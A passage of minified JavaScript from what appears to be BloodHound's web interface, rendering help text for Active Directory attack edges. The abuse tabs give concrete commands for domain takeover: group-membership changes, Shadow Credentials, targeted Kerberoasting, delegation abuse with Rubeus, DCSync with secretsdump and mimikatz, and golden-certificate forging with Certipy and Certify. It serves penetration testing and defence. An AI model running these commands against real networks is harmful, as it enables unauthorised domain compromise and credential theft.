users and computers that are in the given OU as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of an OU can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target OU through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With GenericWrite permission over a domain object, you may make modifications to the gPLink attribute of the domain. The ability to alter the gPLink attribute of a domain may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the domain user and computer objects (including the ones located in nested OUs). This can be exploited to make said child items execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a Linux machine, the gPLink manipulation attack vector may be exploited using the"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/synacktiv/OUned",children:"OUned.py"})," ","tool. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory",children:"the article associated to the OUned.py tool"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given domain as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of a domain can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target domain through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"CertTemplate":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericWrite permission over a certificate template, you may be able to perform an ESC4 attack by modifying the template's attributes. BloodHound will in that case create an ADCSESC4 edge from the principal to the forest domain node."})});case"EnterpriseCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericWrite permission over an enterprise CA, you can publish certificate templates to the enterprise CA by adding the CN name of the template in the enterprise CA object's certificateTemplates attribute. This action may enable you to perform an ADCS domain escalation."})});case"RootCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericWrite permission over a root CA, you can make a rogue certificate trusted as a root CA in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation."})});case"NTAuthStore":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericWrite permission over a NTAuth store, you can make an enterprise CA certificate trusted for NT (domain) authentication in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation."})});case"IssuancePolicy":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericWrite permission over an issuance policy object, you create a OID group link to a targeted group by adding the group's distinguishedName in the msDS-OIDToGroupLink attribute of the issuance policy object. This action may enable you to gain membership of the group through an ADCS ESC13 attack."})});default:return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"No abuse information available for this node type."})})}},Fp=()=>e.jsx(t,{variant:"body2",children:"This depends on the target object and how to take advantage of this permission. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."}),_p=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/",children:"https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/eladshamir/Whisker",children:"https://github.com/eladshamir/Whisker"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab",children:"https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://labs.withsecure.com/publications/ou-having-a-laugh",children:"https://labs.withsecure.com/publications/ou-having-a-laugh"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory",children:"https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://decoder.cloud/2023/11/20/a-deep-dive-in-cert-publishers-group/",children:"https://decoder.cloud/2023/11/20/a-deep-dive-in-cert-publishers-group/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53",children:"https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53"})]}),Up=({sourceName:r,sourceType:a,targetName:o,targetType:i})=>{switch(i){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"GenericWrite to a group allows you to directly modify group membership of the group."}),e.jsx(t,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember permission. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),e.jsxs(t,{variant:"body2",children:["To abuse this permission with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),e.jsx(t,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["GenericWrite grants ",r,' the permission to write to the "msds-KeyCredentialLink" attribute of target. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is equivalent to the "AddKeyCredentialLink" edge.']}),e.jsxs(t,{variant:"body2",children:["Alternatively, GenericWrite enables ",r," to set a ServicePrincipalName (SPN) on the targeted user, which may be abused in a Targeted Kerberoast attack."]}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsx(t,{variant:"body2",children:"To abuse the permission, use Whisker. "}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"||a==="Computer"?`${r} if you are not running a process as that user/computer`:`a member of ${r} if you are not running a process as a member`]}),e.jsx(t,{component:"pre",children:"Whisker.exe add /target:<TargetPrincipal>"}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the Whisker documentation."}),e.jsx(t,{variant:"body1",children:" Targeted Kerberoast attack "}),e.jsx(t,{variant:"body2",children:"A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"}),e.jsx(t,{variant:"body2",children:"After running this, you can use Get-DomainSPNTicket as follows:"}),e.jsx(t,{component:"pre",children:"Get-DomainSPNTicket -Credential $Cred harmj0y | fl"}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:"}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname"})]});case"GPO":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With GenericWrite on a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),e.jsx(t,{variant:"body2",children:"This edge can be a false positive in rare scenarios. If you have GenericWrite on the GPO with 'This object only' (no inheritance) and no other permissions in the ACL, it is not possible to add or modify settings of the GPO. The GPO's settings are stored in SYSVOL under a folder for the given GPO. Therefore, you need write access to child objects of this folder or create child objects permission. The security descriptor of the GPO is reflected on the folder, meaning permissions to write child items on the GPO are required."})]});case"Computer":return e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["GenericWrite grants ",r,' the permission to write to the "msds-KeyCredentialLink" attribute of ',o,'. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is equivalent to the "AddKeyCredentialLink" edge.']}),e.jsx(t,{variant:"body2",children:"Alternatively, GenericWrite on a computer object can be used to perform a Resource-Based Constrained Delegation attack."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsx(t,{variant:"body2",children:"To abuse the permission, use Whisker. "}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"||a==="Computer"?`${r} if you are not running a process as that user/computer`:`a member of ${r} if you are not running a process as a member`]}),e.jsx(t,{component:"pre",children:"Whisker.exe add /target:<TargetPrincipal>"}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the Whisker documentation."}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation attack "}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]});case"OU":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With GenericWrite permissions over an OU, you may make modifications to the gPLink attribute of the OU. The ability to alter the gPLink attribute of an OU may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the OU's child user and computer objects (including the ones located in nested sub-OUs). This can be exploited to make said child items execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a domain-joined compromised Windows machine, the gPLink manipulation attack vector may be exploited through Powermad, PowerView and native Windows functionalities. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://labs.withsecure.com/publications/ou-having-a-laugh",children:"this article"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given OU as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of an OU can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target OU through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With GenericWrite permission over a domain object, you may make modifications to the gPLink attribute of the domain. The ability to alter the gPLink attribute of a domain may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the domain user and computer objects (including the ones located in nested OUs). This can be exploited to make said child items execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a domain-joined compromised Windows machine, the gPLink manipulation attack vector may be exploited through Powermad, PowerView and native Windows functionalities. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://labs.withsecure.com/publications/ou-having-a-laugh",children:"this article"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given domain as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of a domain can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target domain through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"CertTemplate":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericWrite permission over a certificate template, you may be able to perform an ESC4 attack by modifying the template's attributes. BloodHound will in that case create an ADCSESC4 edge from the principal to the forest domain node."})});case"EnterpriseCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericWrite permission over an enterprise CA, you can publish certificate templates to the enterprise CA by adding the CN name of the template in the enterprise CA object's certificateTemplates attribute. This action may enable you to perform an ADCS domain escalation."})});case"RootCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericWrite permission over a root CA, you can make a rogue certificate trusted as a root CA in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation."})});case"NTAuthStore":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericWrite permission over a NTAuth store, you can make an enterprise CA certificate trusted for NT (domain) authentication in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation."})});case"IssuancePolicy":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With GenericWrite permission over an issuance policy object, you create a OID group link to a targeted group by adding the group's distinguishedName in the msDS-OIDToGroupLink attribute of the issuance policy object. This action may enable you to gain membership of the group through an ADCS ESC13 attack."})});default:return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"No abuse information available for this node type."})})}},Wp={general:Mp,windowsAbuse:Up,linuxAbuse:Lp,opsec:Fp,references:_p},Bp=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," the DS-Replication-Get-Changes permission on the domain"," ",o,"."]}),e.jsx(t,{variant:"body2",children:"Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes-All, a principal may perform a DCSync attack."})]}),qp=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:"}),e.jsx(t,{component:"pre",children:"secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'"}),e.jsx(t,{variant:"body2",children:"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."})]}),Kp=()=>e.jsx(t,{variant:"body2",children:"For detailed information on detection of dcsync as well as opsec considerations, see the adsecurity post in the references tab."}),zp=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://adsecurity.org/?p=1729",children:"https://adsecurity.org/?p=1729"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/",children:"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"})]}),Hp=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:"}),e.jsx(t,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:Administrator"}),e.jsx(t,{variant:"body2",children:"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."})]}),Vp={general:Bp,windowsAbuse:Hp,linuxAbuse:qp,opsec:Kp,references:zp},Yp=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," the DS-Replication-Get-Changes-All permission on the domain"," ",o,"."]}),e.jsx(t,{variant:"body2",children:"Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes, a principal may perform a DCSync attack."})]}),Qp=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:"}),e.jsx(t,{component:"pre",children:"secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'"}),e.jsx(t,{variant:"body2",children:"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."})]}),Jp=()=>e.jsx(t,{variant:"body2",children:"For detailed information on detection of dcsync as well as opsec considerations, see the adsecurity post in the references tab."}),Xp=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://adsecurity.org/?p=1729",children:"https://adsecurity.org/?p=1729"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/",children:"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"})]}),Zp=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:"}),e.jsx(t,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:Administrator"}),e.jsx(t,{variant:"body2",children:"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."})]}),eu={general:Yp,windowsAbuse:Zp,linuxAbuse:Qp,opsec:Jp,references:Xp},tu=({sourceDBId:r,targetDBId:a,edgeName:o})=>{const{isLoading:i,isError:s,nodesArray:c}=Z({sourceDBId:r,targetDBId:a,edgeName:o,type:V.composition});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The relationship represents the effective outcome of the configuration and relationships between several different objects. All objects involved in the creation of this relationship are listed here:"}),e.jsx(l,{py:1,children:i?e.jsx(H,{variant:"rounded"}):s?e.jsx(K,{severity:"error",children:"Couldn't load edge composition"}):e.jsx(X,{nodes:c})})]})},ru=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The ",N(a)," ",r,' has a certificate private key that can be abused to sign "golden" certificates for authentication of any enabled principal in the AD forest of domain'," ",o,"."]}),e.jsxs(t,{variant:"body2",children:["The ",N(a)," ",r," hosts the enrollment service of an enterprise CA which implies it has the private key of the enterprise CA's certificate. This private key allows an attacker to sign certificates for authentication as any enabled principal in the AD forest of domain ",o,", as the enterprise CA is trusted for NT authentication and chain up to a root CA."]}),e.jsxs(t,{variant:"body2",children:["It may not be possible to obtain the certificate private key if it is protected with a Trusted Platform Module (TPM) or using a Hardware Security Module (HSM). However, it may still be possible to compromise the AD forest. Administrative access to the enterprise CA host lets an attacker publish certificate templates, approve denied enrollment requests, and more. The ",N(a)," ",r," will have an ESC7 edge to the domain ",o," if any such attack has been found possible by BloodHound."]})]}),nu=()=>e.jsx(e.Fragment,{children:e.jsxs(t,{variant:"body2",children:["1) Back up the CA certificate with the credentials of a user with admin access on the enterprise CA host using Certipy:",e.jsx(t,{component:"pre",children:"certipy ca -backup -ca 'dumpster-DC01-CA' -username jd@dumpster.fire -password 'Password123!'"}),"The enterprise CA certificate is the one where issuer and subject are identical.",e.jsx("br",{}),e.jsx("br",{}),"2) Forge a certificate of a target principal:",e.jsx(t,{component:"pre",children:"certipy forge -ca-pfx dumpster-DC01-CA.pfx -upn Roshi@dumpster.fire -subject 'CN=Roshi,OU=Users,OU=Tier0,DC=dumpster,DC=fire'"}),e.jsx("br",{}),"3) Request a TGT for the targeted principal using the certificate against a given DC:",e.jsx(t,{component:"pre",children:"certipy auth -pfx roshi_forged.pfx -dc-ip '192.168.100.10'"})]})}),au=()=>e.jsx(t,{variant:"body2",children:"When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate."}),ou=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Certify/wiki/3-%E2%80%90-Domain-Persistence-Techniques#dpersist1---forging-certificates-with-stolen-ca-certificates",children:"https://github.com/GhostPack/Certify/wiki/3-%E2%80%90-Domain-Persistence-Techniques#dpersist1---forging-certificates-with-stolen-ca-certificates"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Certify",children:"https://github.com/GhostPack/Certify"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Rubeus",children:"https://github.com/GhostPack/Rubeus"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ly4k/Certipy#golden-certificates",children:"https://github.com/ly4k/Certipy#golden-certificates"})]}),iu=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Obtain CA certificate incl. private key"}),e.jsxs(t,{variant:"body2",children:["Use Certify (2.0) to export all certificates in the local machine certificate store and identify the CA certificate by the name of the CA:",e.jsx(t,{component:"pre",children:"Certify.exe manage-self --dump-certs"})]}),e.jsx(t,{variant:"body1",children:"Forge certificate and obtain a TGT as targeted principal"}),e.jsxs(t,{variant:"body2",children:["Forge a certificate of a target principal:",e.jsx(t,{component:"pre",children:"Certify.exe forge --ca-cert <pfx-path/base64-pfx> --upn Administrator --sid S-1-5-21-976219687-1556195986-4104514715-500"}),e.jsx("br",{}),"Request a TGT for the targeted principal using the certificate with Rubeus:",e.jsx(t,{component:"pre",children:"Rubeus.exe asktgt /user:Administrator /domain:dumpster.fire /certificate:<pfx-path/base64-pfx>"})]})]}),su={general:ru,windowsAbuse:iu,linuxAbuse:nu,opsec:au,references:ou,composition:tu},cu=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"No special actions are needed to abuse this, as the kerberos tickets created will have all SIDs in the object's SID history attribute added to them; however, if traversing a domain trust boundary, ensure that SID filtering is not enforced, as SID filtering will ignore any SIDs in the SID history portion of a kerberos ticket."}),e.jsx(t,{variant:"body2",children:"By default, SID filtering is not enabled for all domain trust types."})]}),lu=({sourceName:r,sourceType:a,targetName:o,targetType:i})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The ",N(a)," ",r," has, in its SIDHistory attribute, the SID for the"," ",N(i)," ",o,"."]}),e.jsxs(t,{variant:"body2",children:["When a Kerberos ticket is created for ",r,", it will include the SID for ",o," and therefore grant ",r," the same privileges and permissions as ",o,"."]})]}),du=()=>e.jsx(t,{variant:"body2",children:"No opsec considerations apply to this edge."}),hu=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/redteaming/the-trustpocalypse/",children:"https://blog.harmj0y.net/redteaming/the-trustpocalypse/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/",children:"https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener 